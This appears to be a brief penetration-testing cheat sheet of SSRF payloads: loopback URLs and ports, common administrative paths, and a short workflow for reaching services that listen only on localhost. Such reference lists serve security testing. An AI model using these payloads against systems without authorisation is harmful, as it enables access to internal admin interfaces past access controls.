# Localhost SSRF Payloads

## Common Loopback Addresses

```text
http://localhost

http://localhost/

http://localhost/admin

http://127.0.0.1

http://127.0.0.1/

http://127.0.0.1/admin

http://127.1

http://127.1/admin
```

---

## Localhost with Ports

```text
http://localhost:80

http://localhost:8080

http://localhost:8000

http://localhost:5000

http://127.0.0.1:8080

http://127.0.0.1:5000
```

---

## Common Admin Endpoints

```text
/admin

/admin/login

/admin/delete

/dashboard

/debug

/manage

/actuator

/status

/config
```

---

## Testing Workflow

1. Confirm SSRF.
2. Replace the target URL with localhost.
3. Test common ports.
4. Enumerate common administrative paths.
5. Inspect responses for hidden functionality.

---

## Notes

- Localhost is frequently trusted.
- Requests from localhost may bypass access controls.
- Administrative interfaces often listen only on loopback addresses.